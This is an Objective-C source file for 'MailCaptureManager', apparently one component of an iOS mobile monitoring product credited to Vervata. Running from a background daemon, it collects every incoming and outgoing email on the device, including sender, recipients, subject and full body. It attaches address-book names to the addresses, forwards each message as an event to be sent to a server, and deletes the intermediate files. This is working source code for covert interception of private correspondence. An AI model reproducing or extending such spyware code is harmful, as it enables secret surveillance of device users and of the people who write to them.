/**
 - Project name :  MailCapture
 - Class name   :  MailCaptureManager
 - Version      :  1.0  
 - Purpose      :  For MailCaptureManager Component
 - Copy right   :  13/12/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "MailCaptureManager.h"
#import "DefStd.h"
#import "SocketIPCReader.h"
#import "FxEmailEvent.h"
#import "FxEvent.h"
#import "FxRecipient.h"
#import "ABContactsManager.h"
#import "FxEventEnums.h"
#import "DateTimeFormat.h"
#import "EventDelegate.h"
#import "DaemonPrivateHome.h"
#import "FMDatabase.h"

#import "SBDidLaunchNotifier.h"
#import <UIKit/UIKit.h>

@interface MailCaptureManager (PrivateMethods)
// Method for creating system event.
-(void)createAndSendEvent: (NSDictionary *) aMailLog;
//Method for remove mail message;
- (void) removeMail: (NSString *) aPath;
//Method for Format Email
-(NSString *) formatEmail:(NSString *) aEmail;
@end

@implementation MailCaptureManager

+ (void) clearEmailHistory {
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSString *privateSharedHome = [DaemonPrivateHome daemonSharedHome];
	
	NSString *dbPath = [privateSharedHome stringByAppendingString:@"capturedmail.db"];
	if ([fileManager fileExistsAtPath:dbPath]) {
		FMDatabase *db = [FMDatabase databaseWithPath:dbPath];
		[db open];
		[db executeUpdate:@"delete from captured_mail"];
        [db executeUpdate:@"delete from captured_external_id_mail"];
		[db close];
	}
	
	dbPath = [privateSharedHome stringByAppendingString:@"blockedmail.db"];
	if ([fileManager fileExistsAtPath:dbPath]) {
		FMDatabase *db = [FMDatabase databaseWithPath:dbPath];
		[db open];
		[db executeUpdate:@"delete from captured_mail"];
		[db close];
	}
}

/**
 - Method name: initWithEventDelegate
 - Purpose:This method is used to initialize the MailCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate)
 - Return description: No return type
 */

- (id) initWithEventDelegate :(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mSBNotifier = [[SBDidLaunchNotifier alloc] init];
		[mSBNotifier setMDelegate:self];
		[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
	}
	return self;
}

/**
 - Method name:startMonitoring
 - Purpose: This method is used for start operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) startMonitoring {
	if (!mMessagePortIPCReader) {
		mMessagePortIPCReader = [[MessagePortIPCReader alloc] initWithPortName:kEmailMessagePort
													withMessagePortIPCDelegate:self];
		[mMessagePortIPCReader start];
		DLog (@"Start Monitoring...");
	}
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kEmailMessagePort
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
		
		if (mSharedFileReader1) {
			[mSBNotifier start];
		}
		DLog (@"Start Monitoring...");
	}
	
}

/**
 - Method name:stopMonitoring
 - Purpose: This method is used for stop operation for receiving sms command.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) stopMonitoring {
	if (mMessagePortIPCReader) {
		[mMessagePortIPCReader stop];
		[mMessagePortIPCReader release];
		mMessagePortIPCReader = nil;
	}
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
	DLog (@"stopMonitoring...");
}

/**
 - Method name:didReceivedSMSData
 - Purpose: This method is invoked when receiving sms command.
 - Argument list and description: aData (NSData *)
 - Return type and description: No Return
*/

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog (@"dataDidReceivedFromMessagePort...");
	if([aRawData length]) {
		NSString *mailPath=[[NSString alloc]initWithData:aRawData encoding:NSUTF8StringEncoding];
		NSData *datafile=[NSData dataWithContentsOfFile:mailPath];
		NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:datafile];
		NSDictionary *dictionary = [[unarchiver decodeObjectForKey:kMAILMonitorKey] retain];
		[unarchiver finishDecoding];
		[self createAndSendEvent:dictionary];
		[self removeMail:mailPath];
		[dictionary release];
		[unarchiver release];
		
	}
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}


-(void)createAndSendEvent: (NSDictionary *) aMailLog {
	FxEmailEvent *mailEvent=[[FxEmailEvent alloc]init];
	ABContactsManager *contactManager=[[ABContactsManager alloc]init];
	NSArray *headers=[aMailLog objectForKey:kMAILHeaders];
	NSArray *body=[aMailLog objectForKey:kMAILBody];
	NSString *senderAddress=[[headers objectAtIndex:0] objectForKey:kMAILFrom];
	NSString *subject=[[headers objectAtIndex:0] objectForKey:kMAILSubject];
	NSString *message=[[body objectAtIndex:0] objectForKey:kMAILMessage];
	NSString *messageType=[[body objectAtIndex:0] objectForKey:kMAILMessageType];
	NSString *mailType=[aMailLog objectForKey:kMAILType];
	if ([messageType isEqualToString:kMAILBodyTypeHtml]) 
		[mailEvent setHtml:YES];
	else 
		[mailEvent setHtml:NO];
	
	if ([mailType isEqualToString:kMAILTypeIncomming]) 
		[mailEvent setDirection:kEventDirectionIn];
	else 
		[mailEvent setDirection:kEventDirectionOut];
	
	NSArray *to= [[headers objectAtIndex:0] objectForKey:kMAILTo];
	NSArray *cc= [[headers objectAtIndex:0] objectForKey:kMAILCc];
	NSArray *bcc= [[headers objectAtIndex:0] objectForKey:kMAILBCc];
	
	for (NSString *addr in to) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		/*		
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]]; 
		 ISSUE:
		 This cause the issue of wrong contact name like "Som Som" in the case that 
		 -  have more than identical email in the same contact
		 -  more than one contact with the identical email							 
		 */		
		//[recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmail:[self formatEmail:addr]]];
        [recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmailV2:[self formatEmail:addr]]];
		[recipientInfo setRecipType:kFxRecipientTO];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	for (NSString *addr in cc) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		/*		
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]];
		 ISSUE:
		 This cause the issue of wrong contact name like "Som Som" in the case that 
		 -  have more than identical email in the same contact
		 -  more than one contact with the identical email							 
		 */		
		//[recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmail:[self formatEmail:addr]]];
        [recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmailV2:[self formatEmail:addr]]];
		[recipientInfo setRecipType:kFxRecipientCC];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	for (NSString *addr in bcc) {
		FxRecipient *recipientInfo=[[FxRecipient alloc]init];
		[recipientInfo setRecipNumAddr:addr];
		//[recipientInfo setRecipContactName:[contactManager searchContactNameWithEmail:[self formatEmail:addr]]];
		/*		
		[recipientInfo setRecipContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:addr]]];
		 ISSUE:
		 This cause the issue of wrong contact name like "Som Som" in the case that 
		 -  have more than identical email in the same contact
		 -  more than one contact with the identical email							 
		 */		
		//[recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmail:[self formatEmail:addr]]];
        [recipientInfo setRecipContactName:[contactManager searchDistinctFirstLastNameWithEmailV2:[self formatEmail:addr]]];
        
		[recipientInfo setRecipType:kFxRecipientBCC];
		[mailEvent addRecipient:recipientInfo];
		[recipientInfo release];
	}
	[mailEvent setSenderEmail:senderAddress];
	//[mailEvent setSenderContactName:[contactManager searchContactNameWithEmail:[self formatEmail:senderAddress]]];
	/*		
	[mailEvent setSenderContactName:[contactManager searchFirstLastNameWithEmail:[self formatEmail:senderAddress]]];
	 ISSUE:
	 This cause the issue of wrong contact name like "Som Som" in the case that 
	 -  have more than identical email in the same contact
	 -  more than one contact with the identical email							 
	 */		
	//[mailEvent setSenderContactName:[contactManager searchDistinctFirstLastNameWithEmail:[self formatEmail:senderAddress]]];
    [mailEvent setSenderContactName:[contactManager searchDistinctFirstLastNameWithEmailV2:[self formatEmail:senderAddress]]];
	[mailEvent setSubject:subject];
	[mailEvent setMessage:message];
	[mailEvent setDateTime:[DateTimeFormat phoenixDateTime]];
	[mailEvent setEventType:kEventTypeMail];
	//=============================For Debug=========================================
	
	DLog (@"====================%@  Details=============",mailType);
	//DLog (@"Sender Name:---%@",[contactManager searchContactName:senderAddress]);
	DLog (@"Sender Name:---%@", [mailEvent senderContactName]);
	DLog (@"Sender Address:---%@",senderAddress);
	DLog (@"To address list:%@",to);
	DLog (@"Cc address list:%@",cc);
	DLog (@"bcc address list:%@",bcc);
	DLog (@"Type:---%@",messageType);
	DLog (@"Subject:---%@",subject);
	DLog (@"Message:---%@",message);
	DLog (@"Mail Type:---%@",mailType);
	DLog (@"===========================================");
    
    DLog(@"Recipients %@", [mailEvent recipientArray])
	[contactManager release];
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@ SEND EMAIL EVENT TO SERVER @@@@@@@@@@@@@@@@@@@@@@@@@")
		DLog (@"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@")
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:mailEvent];
	}
	[mailEvent release];
	
}

- (void) springboardDidLaunch {
//	system("killall MobileMail");
}

/**
 - Method name:removeMailMessageFromMessagePort
 - Purpose: This method is used to remove Mail message.
 - Argument list and description: aPath (NSString *)
 - Return type and description: No Return
 */


- (void) removeMail: (NSString *) aPath {
	NSFileManager *fileManager=[NSFileManager defaultManager];
	NSError *error=nil;
	if ([fileManager removeItemAtPath:aPath error:&error]) {
		DLog (@"Removed mail message");
	}
	else {
		DLog (@"Error occured while removing mail message")
	}
}

/**
 - Method name:formatEmail
 - Purpose: This method is used to remove Mail message.
 - Argument list and description: aEmail (NSString *)
 - Return type and description: No Return
 */



-(NSString *) formatEmail:(NSString *) aEmail {
	NSString *formatString=@"";
	if ([aEmail length]>0) {
		DLog (@"Email:%@",aEmail);
	  //Initial value of start location
	   NSRange beginRange =NSMakeRange(0, 0);
	   //Initial value of end location 
	   NSRange endRange=NSMakeRange(0, 0);
	   //Find the location of Starting tag '<' 
	   beginRange = [aEmail rangeOfString:@"<"];
	   //Find the location of ending tag '>' 
       endRange = [aEmail rangeOfString:@">"];
	   int rangeDiff=(int)(endRange.location-beginRange.location);
	   if (rangeDiff>0) 
		//Successfull! Extract  the string between < > tags
          formatString=[aEmail substringWithRange:NSMakeRange(beginRange.location+1, rangeDiff-1)];
		else 
			formatString=aEmail;	

	}
	return formatString;
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[self stopMonitoring];
    [mSBNotifier release];
	DLog (@"dealloc...");
	[super dealloc];
}

@end
